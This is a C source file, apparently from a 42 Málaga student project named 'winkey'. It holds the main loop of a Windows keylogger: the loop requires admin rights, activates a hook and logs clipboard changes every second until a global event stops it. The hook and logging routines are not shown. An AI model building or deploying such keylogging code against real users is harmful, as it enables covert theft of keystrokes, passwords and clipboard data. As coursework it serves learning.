/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/08 13:00:34 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/21 16:17:17 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "winkey.h"

#pragma endregion

#pragma region "Variables"

	// Variables go here, if any

#pragma endregion

#pragma region "Is Admin"

	BOOL IsAdmin(void) {
		BOOL isAdmin = FALSE;
		HANDLE hToken = NULL;
		
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION elevation;
			DWORD dwSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
				isAdmin = elevation.TokenIsElevated;       
			CloseHandle(hToken);
		}
		
		return (isAdmin);
	}

#pragma endregion

#pragma region "Main"

	int main(void) {
		// Check for administrator privileges
		if (!IsAdmin()) return (printf("\nAdministrator privileges are required\n"), 1);
		
		// Activate the hook
		if (!ActivateHook()) {
			return 1;
		}
		
		// Main loop to keep the hook active
		MSG msg;
		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, "Global\\WinkeyTerminateEvent");

		// To control the interval for clipboard checking (time in ms since Windows startup)
		DWORD lastClipboardCheck = GetTickCount();
		
		while(TRUE)
		{
			// Process messages (including hook events)
			while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
				if (msg.message == WM_QUIT) {
					break;
				}
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}

			if (WaitForSingleObject(hEvent, 10) == WAIT_OBJECT_0) {
				break;
			}

			// Check clipboard every 1000 ms (1 second)
			if (GetTickCount() - lastClipboardCheck > 1000) {
				LogClipboardIfChanged();
				lastClipboardCheck = GetTickCount(); // Reset counter
			}

			Sleep(10);
		}

		CloseHandle(hEvent);
		DeactivateHook();
		return (0);
	}

#pragma endregion
